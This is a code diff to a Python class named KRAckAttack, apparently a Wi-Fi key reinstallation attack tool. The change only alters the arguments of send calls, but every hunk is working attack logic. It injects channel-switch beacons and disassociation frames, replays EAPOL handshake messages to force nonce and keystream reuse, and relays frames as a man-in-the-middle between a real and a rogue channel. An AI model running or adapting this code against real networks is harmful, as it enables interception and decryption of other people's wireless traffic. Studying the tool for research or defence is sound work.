@@ -257,17 +257,17 @@ class KRAckAttack():
 			# Note: Intel firmware requires first receiving a CSA beacon with a count of 2 or higher,
 			# followed by one with a value of 1. When starting with 1 it errors out.
 			csabeacon = append_csa(beacon, newchannel, 2)
-			self.sock_real.send(csabeacon, self.netconfig.real_channel)
+			self.sock_real.send(csabeacon, False, self.netconfig.real_channel)
 
 			csabeacon = append_csa(beacon, newchannel, 1)
-			self.sock_real.send(csabeacon, self.netconfig.real_channel)
+			self.sock_real.send(csabeacon, False, self.netconfig.real_channel)
 
 		if not silent: log(STATUS, "Injected %d CSA beacon pairs (moving stations to channel %d)" % (numbeacons, newchannel), color="green")
 
 	def send_disas(self, macaddr):
 		dot11 = Dot11(addr1=macaddr, addr2=self.apmac, addr3=self.apmac)
-		disas = RadioTap()/dot11/Dot11Disas(reason=0)
-		self.sock_rogue.send(disas, self.netconfig.rogue_channel)
+		disas = dot11/Dot11Disas(reason=0)
+		self.sock_rogue.send(disas, True, self.netconfig.rogue_channel)
 		log(STATUS, "Rogue channel: injected Disassociation to %s" % macaddr, color="green")
 
 	def queue_disas(self, macaddr):
@@ -306,7 +306,7 @@ class KRAckAttack():
 				packet_list = client.msg3s
 				p = set_eapol_replaynum(client.msg1, get_eapol_replaynum(packet_list[0]) + 1)
 				packet_list.insert(1, p)
-				for p in packet_list: self.sock_rogue.send(p, self.netconfig.rogue_channel)
+				for p in packet_list: self.sock_rogue.send(p, True, self.netconfig.rogue_channel)
 				client.msg3s = []
 				client.attack_start()
 			else:
@@ -334,7 +334,7 @@ class KRAckAttack():
 			if keystream == client.get_keystream(iv):
 				log(STATUS, "SUCCESS! Nonce and keystream reuse detected (IV=%d)." % iv, color="green", showtime=False)
 				client.update_state(ClientState.Success_Reinstalled)
-				self.sock_real.send(client.msg4, self.netconfig.real_channel)
+				self.sock_real.send(client.msg4, True, self.netconfig.real_channel)
 
 			# Otherwise the client likely installed a new key, i.e., probably an all-zero key
 			else:
@@ -363,7 +363,7 @@ class KRAckAttack():
 			log(STATUS, "Queued %s group message 1's" % len(self.group1), showtime=False)
 			if len(self.group1) == 2:
 				log(STATUS, "Forwarding first group1 message", showtime=False)
-				self.sock_rogue.send(self.group1.pop(0), self.netconfig.rogue_channel)
+				self.sock_rogue.send(self.group1.pop(0), True, self.netconfig.rogue_channel)
 
 				self.time_forward_group1 = time.time() + 3
 
@@ -415,7 +415,7 @@ class KRAckAttack():
 			# Prevent the AP from thinking clients that are connecting are sleeping, until attack completed or failed
 			if p.FCfield & 0x10 != 0 and p.addr2 in self.clients and self.clients[p.addr2].state <= ClientState.Attack_Started:
 				log(WARNING, "Injecting Null frame so AP thinks client %s is awake (attacking sleeping clients is not fully supported)" % p.addr2)
-				self.sock_real.send(Dot11(type=2, subtype=4, addr1=self.apmac, addr2=p.addr2, addr3=self.apmac), self.netconfig.real_channel)
+				self.sock_real.send(Dot11(type=2, subtype=4, addr1=self.apmac, addr2=p.addr2, addr3=self.apmac), True, self.netconfig.real_channel)
 
 		# 2. 處理來自原本 AP 的 frames
 		elif p.addr2 == self.apmac:
@@ -441,14 +441,14 @@ class KRAckAttack():
 					elif p.haslayer(Dot11Deauth):
 						del self.clients[p.addr1]
 						print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing")
-						self.sock_rogue.send(p, self.netconfig.rogue_channel)
+						self.sock_rogue.send(p, True, self.netconfig.rogue_channel)
 					else:
 						print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing")
-						self.sock_rogue.send(p, self.netconfig.rogue_channel)
+						self.sock_rogue.send(p, True, self.netconfig.rogue_channel)
 				# Group addressed frames
 				else:
 					print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing")
-					self.sock_rogue.send(p, self.netconfig.rogue_channel)
+					self.sock_rogue.send(p, True, self.netconfig.rogue_channel)
 
 		# 3. Always display all frames sent by or to the targeted client
 		elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
@@ -509,7 +509,7 @@ class KRAckAttack():
 					# Don't mark client as sleeping when we haven't got two Msg3's and performed the attack
 					if client.state < ClientState.Attack_Started:
 						p.FCfield &= 0xFFEF
-					self.sock_real.send(p, self.netconfig.real_channel)
+					self.sock_real.send(p, True, self.netconfig.real_channel)
 
 		# 3. Always display all frames sent by or to the targeted client
 		elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
@@ -643,7 +643,7 @@ class KRAckAttack():
 
 			if self.time_forward_group1 and self.time_forward_group1 <= time.time():
 				p = self.group1.pop(0)
-				self.sock_rogue.send(p, self.netconfig.rogue_channel)
+				self.sock_rogue.send(p, True, self.netconfig.rogue_channel)
 				self.time_forward_group1 = None
 				log(STATUS, "Injected older group message 1: %s" % dot11_to_str(p), color="green")
 
